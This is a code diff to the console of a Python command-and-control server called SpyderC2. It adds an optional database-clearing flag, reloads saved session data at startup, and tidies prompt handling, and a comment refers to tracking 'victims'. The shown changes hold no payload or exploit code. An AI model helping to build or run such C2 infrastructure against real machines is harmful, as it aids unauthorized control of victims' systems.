@@ -23,6 +23,7 @@ PATH = os.path.dirname(os.path.realpath(__file__))
 def parser():
 	parser = argparse.ArgumentParser(description='Python based C2')
 	parser.add_argument('-d', '--detached', help = "Doesn't automatically launch logs in another screen.", action='store_true')
+	parser.add_argument('-c', '--clear-db', help = "Clears database when exiting / error occurs", action='store_true')
 	parser.add_argument('-v', '--verbose', help = 'Generates exe', action='store_true')
 	args = parser.parse_args()
 	return args
@@ -236,8 +237,7 @@ def main(args,db_object,server_logger):
 	print()
 
 	while True:
-		print(colored("(SpyderC2:) > ",'red'), end='')
-		cmd = str(input())
+		cmd = str(input(colored("(SpyderC2:) > ",'red')))
 
 		if cmd == 'http':
 
@@ -321,8 +321,11 @@ def main(args,db_object,server_logger):
 
 		elif cmd == 'exit':
 			Listener.kill_all_listeners()
-			db_object.drop_db()
+			if args.clear_db : db_object.drop_db()
 			break
+		elif cmd == '':
+			print()
+			pass
 		else:
 			print(f"Not supported. Type {colored('help','cyan')} to see commands supported.")
 
@@ -391,8 +394,13 @@ if __name__=="__main__":
 		os.mkdir(os.path.join(PATH,'shared'))
 
 	try:
+		if db_object.db_data_exists():
+			db_object.load_db_data()
+
 		main(args,db_object,server_logger)
 	except:
+
+		## TODO - also mark all the victims dead ? Same during exit
 		server_logger.info_log(traceback.format_exc(),'red')
 		Listener.kill_all_listeners()
-		db_object.drop_db()
+		if args.clear_db : db_object.drop_db()
